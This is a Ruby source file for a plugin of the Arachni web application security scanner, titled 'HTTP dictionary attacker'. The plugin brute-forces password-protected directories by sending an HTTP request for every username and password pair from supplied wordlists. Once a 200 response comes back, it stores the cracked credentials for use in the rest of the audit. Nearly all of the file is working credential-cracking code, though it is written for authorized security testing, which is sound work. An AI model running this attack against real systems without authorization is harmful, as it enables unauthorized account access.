=begin
                  Arachni
  Copyright (c) 2010-2012 Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>

  This is free software; you can copy and distribute and modify
  this program under the term of the GPL v2.0 License
  (See LICENSE file for details)

=end

module Arachni
module Plugins

#
# @author: Tasos "Zapotek" Laskos
#                                      <tasos.laskos@gmail.com>
#                                      <zapotek@segfault.gr>
# @version: 0.1
#
class HTTPDicattack < Arachni::Plugin::Base

    def prepare

        # disable spidering and the subsequent audit
        # @framework.opts.link_count_limit = 0

        # don't scan the website just yet
        @framework.pause!
        print_info( "System paused." )

        @url     = @framework.opts.url.to_s
        @users   = File.read( @options['username_list'] ).split( "\n" )
        @passwds = File.read( @options['password_list'] ).split( "\n" )

        @found = false
    end

    def run

        if !protected?( @url )
            print_info( "The URL you provided doesn't seem to be protected." )
            print_info( "Aborting..." )
            return
        end

        url = URI( @url )

        print_status( "Building the request queue..." )

        total_req = @users.size * @passwds.size
        print_status( "Number of requests to be transmitted: #{total_req}" )

        @users.each {
            |user|

            url.user = user
            @passwds.each {
                |pass|

                url.password = pass
                @framework.http.get( url.to_s ).on_complete {
                    |res|

                    next if @found

                    print_status( "Username: '#{user}' -- Password: '#{pass}'" )
                    next if res.code != 200

                    @found = true

                    print_ok( "Found a match. Username: '#{user}' -- Password: '#{pass}'" )
                    print_info( "URL: #{res.effective_url}" )

                    @framework.opts.url = res.effective_url

                    # register our findings...
                    register_results( { :username => user, :password => pass } )
                    clean_up

                    raise "Stopping the attack."

                }

            }
        }

        print_status( "Waiting for the requests to complete..." )
        @framework.http.run
        print_bad( "Couldn't find a match." )

    end

    def clean_up
        # abort the rest of the queued requests
        @framework.http.abort

        # continue with the scan
        @framework.resume!
    end


    def protected?( url )
        @framework.http.get( url, :async => false ).response.code == 401
    end

    def self.info
        {
            :name           => 'HTTP dictionary attacker',
            :description    => %q{Uses wordlists to crack password protected directories.
                If the cracking process is successful the found credentials will be set
                framework-wide and used for the duration of the audit.
                If that's not what you want set the crawler's link-count limit to "0".},
            :author         => 'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>',
            :version        => '0.1',
            :options        => [
                Arachni::OptPath.new( 'username_list', [ true, 'File with a list of usernames (newline separated).' ] ),
                Arachni::OptPath.new( 'password_list', [ true, 'File with a list of passwords (newline separated).' ] )
            ]
        }
    end

end

end
end
